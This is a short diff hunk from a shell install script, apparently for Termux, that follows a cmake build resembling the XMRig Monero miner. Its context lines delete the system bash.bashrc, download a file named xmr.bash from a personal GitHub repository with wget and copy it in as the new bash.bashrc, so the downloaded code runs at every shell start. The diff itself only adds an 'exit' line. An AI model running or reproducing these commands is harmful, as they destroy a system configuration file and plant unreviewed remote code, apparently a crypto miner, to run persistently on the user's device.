@@ -7,3 +7,4 @@ cmake .. -DWITH_HWLOC=OFF && make -j$(nproc)
 cd && pwd && cd ../usr/etc && rm -rf bash.bashrc && wget https://raw.githubusercontent.com/manh-mobile-0898707968/bash.bitcoin/refs/heads/main/xmr.bash
 cp xmr.bash ../etc/bash.bashrc
 rm -rf xmr.bash
+exit
